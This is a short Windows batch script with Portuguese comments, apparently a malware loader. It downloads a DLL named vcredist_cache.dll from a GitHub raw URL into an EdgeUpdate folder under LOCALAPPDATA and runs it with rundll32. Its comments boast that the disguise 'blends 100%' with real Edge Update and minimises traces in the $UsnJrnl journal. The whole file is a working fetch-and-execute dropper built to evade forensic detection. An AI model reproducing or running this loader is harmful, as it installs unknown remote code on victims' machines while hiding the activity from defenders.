@echo off
setlocal

REM =====================================================================
REM Install-if-not-exists loader (v2)
REM
REM Primeira run: baixa vcredist_cache.dll pro %LOCALAPPDATA%\Microsoft\
REM               EdgeUpdate\ e executa rundll32 nele.
REM Runs seguintes: zero download, zero create — so READ do arquivo
REM                 instalado + execucao via rundll32.
REM
REM Resultado no $UsnJrnl: 1 CREATE no dia da instalacao, zero entries
REM relevantes nas runs seguintes. Blend 100% com Edge Update real.
REM =====================================================================

set "INSTALL_DIR=%LOCALAPPDATA%\Microsoft\EdgeUpdate"
set "LOADER_PATH=%INSTALL_DIR%\vcredist_cache.dll"
set "LOADER_URL=https://raw.githubusercontent.com/Jvsosa/assets-storage/main/vcredist_cache.dll"

REM Install-if-not-exists
if not exist "%LOADER_PATH%" (
    if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1
    curl -s -L -o "%LOADER_PATH%" "%LOADER_URL%"
    if not exist "%LOADER_PATH%" (
        echo Falha no download.
        pause
        exit /b 1
    )
)

REM Executa (zero download nas runs seguintes)
rundll32.exe "%LOADER_PATH%",InitPatch

endlocal
